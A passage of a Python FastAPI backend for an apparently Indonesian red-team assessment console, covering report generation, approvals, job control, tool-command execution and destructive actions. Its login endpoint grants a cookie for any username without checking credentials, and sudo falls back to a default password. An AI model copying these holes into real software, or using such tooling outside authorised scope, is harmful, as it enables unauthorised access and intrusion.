            lines.append(f"| {item['severity_id']} | {item['script']} | {item['finding']} | {item['module_title']} |")
    else:
        lines.append("Belum ada temuan Nmap NSE spesifik yang terekstrak dari job ini.")

    lines.extend(["", "## 6. Temuan", ""])
    if not findings:
        lines.append("Tidak ada evidence bernilai tinggi yang terkumpul pada job ini.")
    else:
        for finding in findings:
            lines.extend([
                f"### Temuan {finding['number']}: {finding['title']}",
                "",
                f"Severity: `{finding['severity']}`",
                "",
                "Deskripsi:",
                *finding["description"],
                "",
                "Bukti:",
                f"- Fase: `{finding['phase_label']}`",
                f"- Modul: `{finding['module_title']}`",
                f"- Execution profile: `{finding['execution_profile']}`",
            ])
            for line in finding["evidence_lines"]:
                lines.append(f"- {line}")
            lines.extend(["", "Dampak:"])
            lines.extend([f"- {item}" for item in finding["impact"]])
            lines.extend(["", "Rekomendasi:"])
            lines.extend([f"- {item}" for item in finding["recommendations"]])
            lines.append("")

    lines.extend(["## 7. Hipotesis Attack Path", ""])
    for index, item in enumerate(hypotheses, start=1):
        lines.append(f"{index}. {item}")

    lines.extend(["", "## 8. Rekomendasi Deteksi dan Monitoring", ""])
    lines.extend([f"- {item}" for item in detections])

    lines.extend(["", "## 9. Rencana Remediasi Prioritas", "", "Segera (0-24 jam):"])
    for index, item in enumerate(plan["immediate"], start=1):
        lines.append(f"{index}. {item}")
    lines.extend(["", "Jangka pendek (1-7 hari):"])
    for index, item in enumerate(plan["short_term"], start=1):
        lines.append(f"{index}. {item}")
    lines.extend(["", "Jangka menengah (7-30 hari):"])
    for index, item in enumerate(plan["medium_term"], start=1):
        lines.append(f"{index}. {item}")

    lines.extend(["", "## 10. Keterbatasan", "", "Asesmen ini tidak mencakup:"])
    lines.extend([f"- {item}" for item in excluded])
    lines.extend([
        "",
        "Karena itu, seluruh dampak pasca-initial-access atau post-compromise masih berupa hipotesis sampai ada validasi terpisah yang diotorisasi.",
        "",
        "## 11. Artefak",
        "",
        "Artefak yang dikumpulkan berasal dari timeline modul, evidence highlights, dan export report job ini.",
        "",
        f"- `evidence-{job['id']}.json`",
        f"- `report-{job['id']}.md`",
        f"- `report-{job['id']}.html`",
        "",
    ])
    return "\n".join(lines)

def build_html_report(job: dict[str, Any], markdown: str | None = None) -> str:
    markdown = markdown if markdown is not None else build_markdown_report(job)

    def render_inline_markdown(text: str) -> str:
        escaped = escape(text)
        return re.sub(r"`([^`]+)`", lambda match: f"<code>{escape(match.group(1))}</code>", escaped)

    def is_unordered_list_line(line: str) -> bool:
        return line.lstrip().startswith("- ")

    def is_ordered_list_line(line: str) -> bool:
        return bool(re.match(r"^\s*\d+\.\s+", line))

    def render_list(lines: list[str], ordered: bool) -> str:
        items: list[str] = []
        for line in lines:
            text = re.sub(r"^\s*-\s+", "", line) if not ordered else re.sub(r"^\s*\d+\.\s+", "", line)
            items.append(f"<li>{render_inline_markdown(text.strip())}</li>")
        tag = "ol" if ordered else "ul"
        return f"<{tag}>{''.join(items)}</{tag}>"

    html_body = []
    for block in markdown.split("\n\n"):
        stripped = block.strip()
        if not stripped:
            continue
        if stripped.startswith("# "):
            html_body.append(f"<h1>{render_inline_markdown(stripped[2:])}</h1>")
            continue
        if stripped.startswith("## "):
            html_body.append(f"<h2>{render_inline_markdown(stripped[3:])}</h2>")
            continue
        if stripped.startswith("### "):
            html_body.append(f"<h3>{render_inline_markdown(stripped[4:])}</h3>")
            continue
        if stripped.startswith("| ") and "\n|" in stripped:
            rows = [row.strip() for row in stripped.splitlines() if row.strip()]
            table_rows = []
            for row in rows:
                if set(row.replace("|", "").replace("-", "").strip()) == set():
                    continue
                raw_cells = [cell.strip() for cell in row.strip("|").split("|")]
                cells = [render_inline_markdown(cell.replace("|", "/")) for cell in raw_cells]
                tag = "th" if not table_rows else "td"
                table_rows.append("<tr>" + "".join(f"<{tag}>{cell}</{tag}>" for cell in cells) + "</tr>")
            html_body.append(f"<table>{''.join(table_rows)}</table>")
            continue
        lines = [line for line in stripped.splitlines() if line.strip()]
        cursor = 0
        while cursor < len(lines):
            line = lines[cursor]
            if is_unordered_list_line(line):
                block_lines: list[str] = []
                while cursor < len(lines) and is_unordered_list_line(lines[cursor]):
                    block_lines.append(lines[cursor])
                    cursor += 1
                html_body.append(render_list(block_lines, ordered=False))
                continue
            if is_ordered_list_line(line):
                block_lines = []
                while cursor < len(lines) and is_ordered_list_line(lines[cursor]):
                    block_lines.append(lines[cursor])
                    cursor += 1
                html_body.append(render_list(block_lines, ordered=True))
                continue
            html_body.append(f"<p>{render_inline_markdown(line.strip())}</p>")
            cursor += 1

    return f"""<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <title>Laporan Penetration Testing - {escape(str(job['target']))}</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {{ font-family: Segoe UI, Arial, sans-serif; margin: 0; background: #eef3f9; color: #17324d; }}
    .wrap {{ max-width: 1120px; margin: 0 auto; padding: 32px 24px 48px; }}
    .card {{ background: #ffffff; border: 1px solid #d9e5f1; border-radius: 22px; padding: 28px 30px; }}
    h1, h2, h3 {{ color: #183b63; margin-top: 0; }}
    h1 {{ font-size: 2rem; margin-bottom: 24px; }}
    h2 {{ font-size: 1.35rem; margin: 28px 0 14px; padding-top: 4px; border-top: 1px solid #e4ecf5; }}
    h3 {{ font-size: 1.1rem; margin: 20px 0 10px; }}
    p {{ margin: 0 0 10px; line-height: 1.7; }}
    ul, ol {{ margin: 8px 0 14px 20px; padding: 0; }}
    li {{ margin: 0 0 8px; line-height: 1.65; }}
    code {{ background: #eef4fb; padding: 2px 6px; border-radius: 6px; }}
    table {{ width: 100%; border-collapse: collapse; margin: 12px 0 16px; }}
    th, td {{ border: 1px solid #d9e5f1; padding: 10px 12px; text-align: left; vertical-align: top; }}
    th {{ background: #f4f8fc; }}
  </style>
</head>
<body>
  <div class="wrap">
    <section class="card">
      {"".join(html_body)}
    </section>
  </div>
</body>
</html>"""

# ============ API Endpoints ============
@app.get("/login")
def login_page(next: str = "/") -> HTMLResponse:
    return _render_login_page(next_url=next)


@app.get("/login/access")
def login_access(next_url: str = "/", username: str = "top-management"):
    cleaned_username = (username or "top-management").strip() or "top-management"
    response = RedirectResponse(url=_safe_next_path(next_url), status_code=303)
    response.set_cookie(
        key="redteam_console_user",
        value=cleaned_username,
        httponly=True,
        samesite="lax",
        secure=False,
        max_age=60 * 60 * 12,
    )
    return response


@app.post("/logout")
def logout() -> RedirectResponse:
    response = RedirectResponse(url="/login", status_code=303)
    response.delete_cookie("redteam_console_user")
    return response


@app.get("/")
def read_index() -> FileResponse:
    return FileResponse(BASE_DIR / "index.html")

@app.get("/favicon.ico")
def read_favicon() -> FileResponse:
    return FileResponse(BASE_DIR / "favicon.ico")

@app.get("/styles.css")
def read_styles() -> FileResponse:
    return FileResponse(BASE_DIR / "styles.css")

@app.get("/script.js")
def read_script() -> FileResponse:
    return FileResponse(BASE_DIR / "script.js")

@app.get("/api/health")
def healthcheck() -> dict[str, str]:
    return {"status": "ok", "mode": EXECUTION_MODE, "destructive": DESTRUCTIVE_MODE}

def build_assessment_markdown_report(assessment_id: str) -> str:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    composite = assessment_composite_job(assessment_id)
    correlation = assessment_correlation(assessment_id)
    recommendations = assessment_recommendations(assessment_id)
    diff = assessment_findings_diff(assessment_id)
    drift = assessment_exposure_drift(assessment_id)
    remediation = remediation_summary(assessment_id)
    workspace = assessment_workspace_dir(assessment)
    base_report = build_markdown_report(composite)
    lines = [
        base_report,
        "",
        "## 12. Ringkasan Assessment-Native",
        "",
        f"- Assessment ID: `{assessment_id}`",
        f"- Target: `{assessment.get('target')}`",
        f"- Risk mode: `{assessment.get('risk_mode')}`",
        f"- Chain preset: `{assessment_chain_preset(assessment)}`",
        f"- Operator: `{assessment.get('operator_name')}`",
        f"- Ticket: `{assessment.get('ticket_ref') or '-'}`",
        f"- Workspace: `{workspace}`",
        f"- Total job terkait: `{correlation['job_count']}`",
        f"- Total evidence lintas job: `{correlation['evidence_count']}`",
        "",
        "## 13. Korelasi Deep Assessment",
        "",
        f"- Port terbuka teridentifikasi: {', '.join(correlation['signals']['open_ports']) or '-'}",
        f"- Port web: {', '.join(correlation['signals']['web_ports']) or '-'}",
        f"- Path exposure: {', '.join(correlation['signals']['paths'][:8]) or '-'}",
        f"- Subdomain / record DNS: {', '.join((correlation['signals']['subdomains'] + correlation['signals']['dns_records'])[:8]) or '-'}",
        f"- File sensitif / download URL: {', '.join((correlation['signals']['exposed_files'] + correlation['signals']['download_urls'])[:8]) or '-'}",
        "",
        "Prioritas tindak lanjut:",
    ]
    priorities = correlation.get('priority_queue', [])
    if priorities:
        for index, item in enumerate(priorities, start=1):
            lines.append(f"{index}. {item['title']} - {item['reason']} (modul: {', '.join(item['modules'])})")
    else:
        lines.append("1. Belum ada prioritas tambahan lintas-job; lanjutkan coverage sesuai recommendations default assessment.")
    lines.extend([
        "",
        "## 14. Drift Exposure Antar Assessment",
        "",
        f"- Baseline assessment: `{drift.get('baseline_assessment_id') or '-'}`",
        f"- Port baru: {', '.join(drift.get('new_signals', {}).get('open_ports', [])[:8]) or '-'}",
        f"- Port resolved: {', '.join(drift.get('resolved_signals', {}).get('open_ports', [])[:8]) or '-'}",
        f"- Path baru: {', '.join(drift.get('new_signals', {}).get('paths', [])[:8]) or '-'}",
        f"- Path resolved: {', '.join(drift.get('resolved_signals', {}).get('paths', [])[:8]) or '-'}",
        f"- Subdomain/DNS baru: {', '.join((drift.get('new_signals', {}).get('subdomains', []) + drift.get('new_signals', {}).get('dns_records', []))[:8]) or '-'}",
        f"- File/download baru: {', '.join((drift.get('new_signals', {}).get('exposed_files', []) + drift.get('new_signals', {}).get('download_urls', []))[:8]) or '-'}",
        "",
        "## 15. Remediation Tracking",
        "",
        f"- Finding assigned owner: `{remediation.get('assigned', 0)}`",
        f"- Finding dengan due date: `{remediation.get('with_due_date', 0)}`",
        f"- Finding overdue (open/accepted-risk): `{remediation.get('overdue_open', 0)}`",
        f"- Ringkasan SLA: `{json.dumps(remediation.get('sla_values', {}), ensure_ascii=False)}`",
        "",
        "## 16. Coverage Preset dan Recommendations",
        "",
        f"- Preset label: `{recommendations['preset']['label']}`",
        f"- Coverage chain: `{recommendations['completed_modules']}/{recommendations['total_chain_modules']}`",
        "- Modul berikut yang direkomendasikan:",
    ])
    next_modules = recommendations.get('recommended_modules', [])
    if next_modules:
        for item in next_modules:
            lines.append(f"  - {item['phase_label']} - {item['title']} ({item['risk_class']})")
    else:
        lines.append("  - Tidak ada modul lanjutan. Coverage assessment sudah penuh.")
    return "\n".join(lines)


def build_assessment_html_report(assessment_id: str) -> str:
    composite = assessment_composite_job(assessment_id)
    markdown = build_assessment_markdown_report(assessment_id)
    return build_html_report(composite, markdown)


@app.get("/api/config")
def config() -> dict[str, Any]:
    sync_lab_config_from_disk()
    return {
        "allowed_subnets": [str(subnet) for subnet in ALLOWED_SUBNETS],
        "lab_profiles": list(LAB_PROFILES),
        "config_source": LAB_CONFIG_SOURCE,
        "config_path": LAB_CONFIG_PATH,
        "execution_mode": EXECUTION_MODE,
        "destructive_mode": DESTRUCTIVE_MODE,
        "range_password_configured": range_password_configured(),
    }

@app.post("/api/config/reload")
def reload_config() -> dict[str, Any]:
    sync_lab_config_from_disk(force=True)
    return {"message": "Configuration reloaded", "config": config()}

@app.post("/api/config/allowed-subnets")
def update_allowed_subnets(payload: ConfigUpdateRequest) -> dict[str, Any]:
    sync_lab_config_from_disk()
    if range_password_configured() and not verify_range_password(payload.password):
        raise HTTPException(status_code=403, detail="Password simpan ranges tidak valid.")
    cleaned = [item.strip() for item in payload.allowed_subnets if item.strip()]
    if not cleaned:
        raise HTTPException(status_code=400, detail="Daftar approved ranges tidak boleh kosong.")
    config_data = save_lab_config(allowed_subnets=cleaned, lab_profiles=LAB_PROFILES)
    apply_lab_config(config_data)
    return {"message": "Approved ranges saved", "config": config()}

@app.get("/api/modules")
def modules() -> dict[str, Any]:
    return {"modules": [serialize_module(module, include_runtime_detail=False) for module in MODULES]}

@app.get("/api/chain-presets")
def chain_presets() -> dict[str, Any]:
    return {"presets": list(CHAIN_PRESETS.values())}

@app.get("/api/modules/{module_id}/dry-run")
def module_dry_run(module_id: str, target: str, note: str = "", execution_profile: str = "balanced") -> dict[str, Any]:
    validated_target = validate_target(target)
    module = MODULE_BY_ID.get(module_id)
    if not module:
        raise HTTPException(status_code=404, detail="Module not found")
    return {"dry_run": module_dry_run_payload(module, validated_target, note, execution_profile)}

def module_dry_run_payload(module, target: str, note: str, execution_profile: str = "balanced") -> dict[str, Any]:
    profile = normalize_execution_profile(execution_profile)
    return {
        "module_id": module.id,
        "title": module.title,
        "phase_label": module.phase_label,
        "target": target,
        "execution_profile": module_execution_profile(module.id, profile),
        "commands": module_command_preview(module.id, target, profile),
        "tooling": list(module_playbook(module).tooling),
        "allowed_checks": list(module_playbook(module).allowed_checks),
        "notes": list(module.preview),
    }

@app.get("/api/tooling")
def tooling() -> dict[str, Any]:
    return {"tools": [{"label": label, "status": tool_status(label)} for label in TOOL_COMMAND_ALIASES.keys()]}

@app.get("/api/engagements")
def engagements() -> dict[str, Any]:
    return {"engagements": ENGAGEMENTS}

@app.get("/api/findings")
def findings() -> dict[str, Any]:
    return {"findings": FINDINGS}

@app.get("/api/assets")
def list_assets() -> dict[str, Any]:
    return {"assets": [serialize_asset(asset) for asset in ASSETS]}

@app.get("/api/assets/{target}")
def get_asset(target: str) -> dict[str, Any]:
    asset = lookup_asset(target)
    if not asset:
        raise HTTPException(status_code=404, detail="Asset not found")
    return {"asset": asset}

@app.get("/api/assessments")
def list_assessments() -> dict[str, Any]:
    assessments = JOB_STORE.list_assessments()
    enriched: list[dict[str, Any]] = []
    for assessment in assessments:
        assessment_id = str(assessment.get("id") or "")
        findings = JOB_STORE.list_findings(assessment_id)
        enriched.append({
            **assessment,
            "finding_count": len(findings),
            "finding_severity_summary": assessment_findings_summary(assessment_id)["severity_summary"] if assessment_id else {},
        })
    return {"assessments": enriched}

@app.get("/api/assessments/{assessment_id}")
def get_assessment(assessment_id: str) -> dict[str, Any]:
    return build_assessment_bundle(assessment_id, include_workspace=True)

@app.get("/api/assessments/{assessment_id}/findings")
def get_assessment_findings(assessment_id: str) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    findings = sync_assessment_findings(assessment_id)
    return {"assessment_id": assessment_id, "findings": findings, "summary": assessment_findings_summary(assessment_id)}

@app.get("/api/assessments/{assessment_id}/diff")
def get_assessment_diff(assessment_id: str) -> dict[str, Any]:
    sync_assessment_findings(assessment_id)
    return assessment_findings_diff(assessment_id)

@app.patch("/api/assessments/{assessment_id}/findings/{finding_id}")
def update_assessment_finding(assessment_id: str, finding_id: str, payload: FindingStatusRequest) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    status = str(payload.status or "open").strip().lower()
    if status not in {"open", "accepted-risk", "mitigated", "false-positive"}:
        raise HTTPException(status_code=400, detail="Status finding tidak valid")
    current = JOB_STORE.get_finding(assessment_id, finding_id)
    if not current:
        raise HTTPException(status_code=404, detail="Finding not found")
    metadata = dict(current.get("metadata") or {})
    metadata["status_note"] = str(payload.note or "").strip()
    metadata["status_updated_at"] = now_iso()
    metadata["owner"] = str(payload.owner or "").strip()
    metadata["due_date"] = str(payload.due_date or "").strip()
    metadata["sla"] = str(payload.sla or "").strip()
    finding = JOB_STORE.update_finding(assessment_id, finding_id, status=status, metadata=metadata, updated_at=now_iso())
    if not finding:
        raise HTTPException(status_code=404, detail="Finding not found")
    return {"finding": finding, "summary": assessment_findings_summary(assessment_id), "diff": assessment_findings_diff(assessment_id), "detail": assessment_detail(assessment_id)}

@app.get("/api/assessments/{assessment_id}/drift")
def get_assessment_drift(assessment_id: str) -> dict[str, Any]:
    sync_assessment_findings(assessment_id)
    return assessment_exposure_drift(assessment_id)

@app.get("/api/approvals/dashboard")
def get_approvals_dashboard() -> dict[str, Any]:
    return approvals_dashboard()

@app.post("/api/assessments")
def create_assessment(payload: AssessmentCreateRequest) -> dict[str, Any]:
    target_kind = normalize_target_kind(payload.target_kind)
    target = validate_target(payload.target, target_kind)
    risk_mode = normalize_risk_mode(payload.risk_mode)
    created_at = now_iso()
    assessment_id = str(uuid.uuid4())
    workspace = assessment_workspace_path(assessment_id)
    assessment = {
        "id": assessment_id,
        "target": target,
        "target_kind": target_kind,
        "assessment_type": payload.assessment_type,
        "risk_mode": risk_mode,
        "operator_name": payload.operator_name,
        "ticket_ref": payload.ticket_ref,
        "note": payload.note,
        "status": "ready",
        "created_at": created_at,
        "updated_at": created_at,
        "metadata": {
            "workspace": workspace,
            "allowed_subnets": [str(subnet) for subnet in ALLOWED_SUBNETS],
            "execution_mode": EXECUTION_MODE,
            "chain_preset": normalize_chain_preset(payload.chain_preset),
        },
    }
    JOB_STORE.create_assessment(assessment)
    return {"assessment": assessment}

@app.get("/api/assessments/{assessment_id}/workspace")
def get_assessment_workspace(assessment_id: str) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    return {"workspace": ensure_workspace_artifacts(assessment_id)}

@app.get("/api/assessments/{assessment_id}/workspace/file")
def get_assessment_workspace_file(assessment_id: str, path: str) -> dict[str, Any]:
    return {"file": read_workspace_file(assessment_id, path)}

@app.get("/api/assessments/{assessment_id}/evidence")
def export_assessment_evidence(assessment_id: str) -> JSONResponse:
    payload = build_assessment_bundle(assessment_id, include_workspace=False)
    payload["jobs"] = assessment_jobs_resolved(assessment_id)
    return JSONResponse(content=payload, headers={"Content-Disposition": f'attachment; filename="assessment-evidence-{assessment_id}.json"'})

@app.get("/api/assessments/{assessment_id}/report.md")
def export_assessment_report_markdown(assessment_id: str) -> PlainTextResponse:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    return PlainTextResponse(content=build_assessment_markdown_report(assessment_id), headers={"Content-Disposition": f'attachment; filename="assessment-report-{assessment_id}.md"'})

@app.get("/api/assessments/{assessment_id}/report.html")
def export_assessment_report_html(assessment_id: str) -> HTMLResponse:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    return HTMLResponse(content=build_assessment_html_report(assessment_id))

@app.post("/api/assessments/{assessment_id}/approve")
def approve_assessment_module(assessment_id: str, payload: AssessmentApprovalRequest) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    module = MODULE_BY_ID.get(payload.module_id)
    if not module:
        raise HTTPException(status_code=404, detail="Module not found")
    expires_at = str(payload.expires_at or "").strip()
    parsed_expiry = parse_iso_timestamp(expires_at)
    if parsed_expiry and parsed_expiry <= datetime.now(timezone.utc):
        raise HTTPException(status_code=400, detail="Approval expiry harus berada di masa depan")
    approval = {
        "id": str(uuid.uuid4()),
        "assessment_id": assessment_id,
        "module_id": module.id,
        "approved_by": payload.approved_by,
        "ticket_ref": payload.ticket_ref or assessment.get("ticket_ref", ""),
        "reason": payload.reason,
        "created_at": now_iso(),
        "expires_at": parsed_expiry.isoformat() if parsed_expiry else "",
        "metadata": {
            "module_title": module.title,
            "risk_class": module.risk_class,
            "risk_mode": assessment.get("risk_mode", "safe"),
        },
    }
    JOB_STORE.create_approval(approval)
    return {"approval": approval}

@app.post("/api/assessments/{assessment_id}/approve-chain")
def approve_assessment_chain(assessment_id: str, payload: ChainApprovalRequest) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    expires_at = str(payload.expires_at or "").strip()
    parsed_expiry = parse_iso_timestamp(expires_at)
    if parsed_expiry and parsed_expiry <= datetime.now(timezone.utc):
        raise HTTPException(status_code=400, detail="Approval expiry harus berada di masa depan")
    modules = bulk_approvable_modules(assessment_id, payload.risk_mode, payload.chain_preset)
    created: list[dict[str, Any]] = []
    for module in modules:
      approval = {
          "id": str(uuid.uuid4()),
          "assessment_id": assessment_id,
          "module_id": module.id,
          "approved_by": payload.approved_by,
          "ticket_ref": payload.ticket_ref or assessment.get("ticket_ref", ""),
          "reason": payload.reason,
          "created_at": now_iso(),
          "expires_at": parsed_expiry.isoformat() if parsed_expiry else "",
          "metadata": {
              "module_title": module.title,
              "risk_class": module.risk_class,
              "risk_mode": assessment.get("risk_mode", "safe"),
              "approval_type": "chain-bulk",
          },
      }
      JOB_STORE.create_approval(approval)
      created.append(approval)
    return {"approvals": created, "count": len(created)}

@app.post("/api/assessments/{assessment_id}/approve-destructive")
def approve_destructive_action(assessment_id: str, payload: DestructiveApprovalRequest) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    action_id = str(payload.action or "").strip()
    if action_id not in DESTRUCTIVE_ACTIONS:
        raise HTTPException(status_code=404, detail="Action not found")
    expires_at = str(payload.expires_at or "").strip()
    parsed_expiry = parse_iso_timestamp(expires_at)
    if parsed_expiry and parsed_expiry <= datetime.now(timezone.utc):
        raise HTTPException(status_code=400, detail="Approval expiry harus berada di masa depan")
    approval = {
        "id": str(uuid.uuid4()),
        "assessment_id": assessment_id,
        "module_id": destructive_approval_module_id(action_id),
        "approved_by": payload.approved_by,
        "ticket_ref": payload.ticket_ref or assessment.get("ticket_ref", ""),
        "reason": payload.reason,
        "created_at": now_iso(),
        "expires_at": parsed_expiry.isoformat() if parsed_expiry else "",
        "metadata": {
            "action": action_id,
            "action_title": DESTRUCTIVE_ACTIONS[action_id]["description"],
            "approval_type": "destructive",
            "risk_mode": assessment.get("risk_mode", "safe"),
            "confirmation_token": destructive_confirmation_token(assessment_id, action_id, str(assessment.get("target") or "")),
        },
    }
    JOB_STORE.create_approval(approval)
    return {"approval": approval}

@app.get("/api/jobs")
def list_jobs() -> dict[str, Any]:
    return {"jobs": [reconcile_job_state(job) for job in JOB_STORE.list_jobs()]}

@app.get("/api/jobs/{job_id}")
def get_job(job_id: str) -> dict[str, Any]:
    job = reconcile_job_state(JOB_STORE.get_job(job_id))
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    return {"job": job, "recommendations": recommended_next_modules_for_job(job), "workspace": ensure_workspace_artifacts(str(runtime_meta(job).get("assessment_id"))) if str(runtime_meta(job).get("assessment_id") or "") else None}

@app.post("/api/jobs/{job_id}/stop")
def stop_job(job_id: str) -> dict[str, Any]:
    job = JOB_STORE.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    updated = request_stop_job(job_id)
    if updated is None:
        raise HTTPException(status_code=404, detail="Job not found")
    return {"message": "Stop requested", "job": reconcile_job_state(updated)}

@app.post("/api/jobs/stop-all")
def stop_all_jobs() -> dict[str, Any]:
    jobs = JOB_STORE.list_jobs()
    active_statuses = {"pending", "running", "stopping"}
    active_jobs = [job for job in jobs if str(job.get("status")) in active_statuses]
    for job in active_jobs:
        request_stop_job(str(job.get("id")), "Bulk stop requested by operator.")
    return {"message": f"Stop requested for {len(active_jobs)} active jobs"}

@app.delete("/api/jobs/{job_id}")
def delete_job(job_id: str) -> dict[str, Any]:
    request_stop_job(job_id, "Delete requested by operator.")
    deleted = JOB_STORE.delete_job(job_id)
    if not deleted:
        raise HTTPException(status_code=404, detail="Job not found")
    return {"message": "Job deleted"}

@app.delete("/api/jobs")
def delete_all_jobs() -> dict[str, Any]:
    for job in JOB_STORE.list_jobs():
        request_stop_job(str(job.get("id")), "Bulk delete requested by operator.")
    deleted = JOB_STORE.delete_all_jobs()
    return {"message": f"{deleted} jobs deleted"}

@app.get("/api/jobs/{job_id}/evidence")
def export_job_evidence(job_id: str) -> JSONResponse:
    job = JOB_STORE.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    return JSONResponse(
        content=export_payload(job),
        headers={"Content-Disposition": f'attachment; filename="evidence-{job_id}.json"'}
    )

@app.get("/api/jobs/{job_id}/report.md")
def export_job_report_markdown(job_id: str) -> PlainTextResponse:
    job = JOB_STORE.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    return PlainTextResponse(
        content=build_markdown_report(job),
        headers={"Content-Disposition": f'attachment; filename="report-{job_id}.md"'}
    )

@app.get("/api/jobs/{job_id}/report.html")
def export_job_report_html(job_id: str) -> HTMLResponse:
    job = JOB_STORE.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    return HTMLResponse(content=build_html_report(job))

@app.post("/api/imports/parse")
def import_parse(payload: ImportRequest) -> dict[str, Any]:
    target_kind = normalize_target_kind(payload.target_kind)
    target = validate_target(payload.target, target_kind)
    return {"result": parse_import(payload.tool_name, target, payload.content)}

@app.post("/api/jobs")
def create_module_job(payload: ModuleJobRequest) -> dict[str, Any]:
    if payload.module_id not in MODULE_BY_ID:
        raise HTTPException(status_code=404, detail="Module not found")
    target_kind = normalize_target_kind(payload.target_kind)
    target = validate_target(payload.target, target_kind)
    module = MODULE_BY_ID[payload.module_id]
    profile = normalize_execution_profile(payload.execution_profile)
    risk_mode = normalize_risk_mode(payload.risk_mode)
    if not module_allowed_in_risk_mode(module, risk_mode):
        raise HTTPException(status_code=403, detail=f"Module {module.title} is not allowed in risk mode {risk_mode}")
    if payload.assessment_id:
        validate_assessment_access(payload.assessment_id, target, risk_mode, target_kind)
    ensure_module_approval(payload.assessment_id, module, risk_mode)
    job = create_job(
        "module",
        module.title,
        target,
        payload.note,
        [module.id],
        profile,
        assessment_id=payload.assessment_id,
        risk_mode=risk_mode,
        chain_preset="full-chain-default",
    )
    return {"job": job}

@app.post("/api/jobs/full-chain")
def create_full_chain_job(payload: ChainJobRequest) -> dict[str, Any]:
    target_kind = normalize_target_kind(payload.target_kind)
    target = validate_target(payload.target, target_kind)
    profile = normalize_execution_profile(payload.execution_profile)
    chain_preset = normalize_chain_preset(payload.chain_preset)
    risk_mode = normalize_risk_mode(payload.risk_mode)
    if payload.assessment_id:
        validate_assessment_access(payload.assessment_id, target, risk_mode, target_kind)
    chain_modules = select_chain_modules(risk_mode, chain_preset)
    if not chain_modules:
        raise HTTPException(status_code=400, detail="No modules available for selected risk mode")
    job = create_job(
        "chain",
        f"Full Assessment {target}",
        target,
        payload.note,
        chain_modules,
        profile,
        assessment_id=payload.assessment_id,
        risk_mode=risk_mode,
        chain_preset=chain_preset,
    )
    return {"job": job}

@app.post("/api/destructive/execute")
def execute_destructive(payload: DestructiveActionRequest) -> dict[str, Any]:
    if DESTRUCTIVE_MODE != "enabled":
        raise HTTPException(status_code=403, detail="Destructive mode is disabled by policy")
    assessment_record = JOB_STORE.get_assessment(payload.assessment_id)
    target_kind = normalize_target_kind(str((assessment_record or {}).get("target_kind") or "ip"))
    target = validate_target(payload.target, target_kind)
    assessment = validate_assessment_access(payload.assessment_id, target, "intrusive", target_kind)
    action_id = str(payload.action or "").strip()
    action_def = DESTRUCTIVE_ACTIONS.get(action_id)
    if not action_def:
        raise HTTPException(status_code=404, detail="Action not found")
    approval = JOB_STORE.get_approval(payload.assessment_id, destructive_approval_module_id(action_id))
    require_valid_approval_record(approval, "Destructive action requires stored destructive approval before execution")
    expected_token = destructive_confirmation_token(payload.assessment_id, action_id, target)
    if str(payload.confirmation_token or "").strip() != expected_token:
        raise HTTPException(status_code=403, detail="Confirmation token tidak valid untuk destructive action ini")

    cmd = action_def["command"].replace("{target}", target)
    result = execute_command_with_progress(cmd, "destructive", target, timeout=300)

    return {
        "success": result["success"],
        "action": action_id,
        "target": target,
        "assessment_id": payload.assessment_id,
        "approved_by": approval.get("approved_by"),
        "ticket_ref": approval.get("ticket_ref") or assessment.get("ticket_ref", ""),
        "command": cmd,
        "output": result.get("stdout", "")[:2000]
    }

@app.get("/api/destructive/actions")
def list_destructive_actions() -> dict[str, Any]:
    return {"actions": [{"id": aid, **adef} for aid, adef in DESTRUCTIVE_ACTIONS.items()]}

@app.get("/api/tools/status")
def get_tools_status() -> dict[str, Any]:
    statuses = {label: tool_status(label) for label in TOOL_COMMAND_ALIASES.keys()}
    return {
        "tools": statuses,
        "summary": {
            "total": len(statuses),
            "available": sum(1 for s in statuses.values() if s.get("installed") is True),
            "conceptual": sum(1 for s in statuses.values() if s.get("kind") == "conceptual"),
        }
    }

@app.get("/api/tools/check/{tool_name}")
def check_tool(tool_name: str) -> dict[str, Any]:
    if tool_name not in TOOL_COMMAND_ALIASES:
        raise HTTPException(status_code=404, detail="Tool not found")
    return tool_status(tool_name)

@app.post("/api/tools/execute")
def execute_tool_command(payload: ToolCommandExecuteRequest) -> dict[str, Any]:
    tool_name = str(payload.tool_name or "").strip().lower()
    command = validate_tool_command_request(tool_name, payload.command)
    timeout = max(5, min(int(payload.timeout or 120), 300))
    provided_sudo_password = str(payload.sudo_password or "").strip()
    requires_sudo = command_requires_sudo_password(command)
    sudo_password = provided_sudo_password or (DEFAULT_SUDO_PASSWORD if requires_sudo else "")
    should_run_with_sudo = bool(sudo_password and requires_sudo)
    effective_command = wrap_command_with_sudo_password(command) if should_run_with_sudo else command
    stdin_text = f"{sudo_password}\n" if should_run_with_sudo else None
    result = execute_command_with_progress(effective_command, "temp", timeout=timeout, stdin_text=stdin_text)
    stderr = str(result.get("stderr", ""))
    sudo_detected = stderr_indicates_sudo_password(stderr)
